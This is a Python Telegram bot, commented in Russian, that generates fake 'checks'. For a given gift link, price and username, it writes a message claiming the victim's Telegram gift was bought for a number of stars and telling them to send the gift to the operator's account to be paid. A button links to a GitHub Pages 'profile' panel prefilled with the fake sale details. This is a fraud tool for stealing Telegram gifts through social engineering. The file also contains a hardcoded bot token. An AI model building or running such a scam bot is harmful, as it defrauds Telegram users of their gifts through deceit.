# gift_bot.py - бот для создания чеков (пересылка текста)
import telebot
from telebot import types
import sqlite3
import os
from urllib.parse import quote

BOT_TOKEN = "8997370724:AAER4GMPqnggfOxv05d-gmFbgV94xXhpDyI"
ADMIN_ID = 6484025560
# Твой юзернейм для получения подарков
MY_USERNAME = "@твой_юзернейм" 
# Ссылка на веб-панель (profile.html)
PROFILE_URL = "https://plaerok228def-blip.github.io/granata-shop/profile.html"

bot = telebot.TeleBot(BOT_TOKEN)

# --- БАЗА ---
conn = sqlite3.connect('gift_shop.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 0)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS checks (id INTEGER PRIMARY KEY, user_id INTEGER, gift_link TEXT, price INTEGER, date TEXT)''')
conn.commit()

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(
            message.chat.id,
            "👑 *Панель чеков*\n\n"
            "Чтобы создать чек, напиши:\n"
            "`/wear <ссылка> <цена> <@username>`\n\n"
            "Пример:\n"
            "`/wear https://t.me/gift123 50 @ivan`",
            parse_mode="Markdown"
        )
    else:
        bot.send_message(message.chat.id, "👋 Привет! Скоро здесь появятся подарки.")

@bot.message_handler(commands=['wear'])
def wear(message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split(maxsplit=3)
    if len(parts) < 4:
        bot.send_message(message.chat.id, "❌ Формат: /wear <ссылка> <цена> <@username>")
        return

    gift_link = parts[1].strip()
    try:
        price = int(parts[2].strip())
    except ValueError:
        bot.send_message(message.chat.id, "❌ Цена должна быть числом.")
        return
    target_username = parts[3].strip()
    if not target_username.startswith("@"):
        target_username = "@" + target_username

    # Ссылка на веб-панель с параметрами
    webapp_url = (
        f"{PROFILE_URL}"
        f"?price={price}"
        f"&gift={quote(gift_link)}"
        f"&to={quote(target_username)}"
    )

    # Текст, который ты перешлёшь
    text = (
        f"Здравствуйте! Ваш подарок {gift_link} был куплен за {price} звёзд.\n\n"
        f"Отправьте подарок {MY_USERNAME} для зачисления звёзд на аккаунт."
    )

    # Кнопка на веб-панель
    kb = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("📊 Открыть профиль", url=webapp_url)
    kb.add(btn)

    # Отправляем тебе сообщение с текстом и кнопкой
    bot.send_message(
        message.chat.id,
        text,
        reply_markup=kb,
        disable_web_page_preview=True
    )
    
    # Сохраняем в базу (чтобы потом показывать в профиле)
    cursor.execute(
        "INSERT INTO checks (user_id, gift_link, price, date) VALUES (?, ?, ?, datetime('now'))",
        (target_username, gift_link, price)
    )
    conn.commit()
    
    bot.send_message(message.chat.id, "✅ Чек создан! Скопируй текст выше и отправь покупателю.")

print("✅ Gift Bot запущен!")
bot.infinity_polling()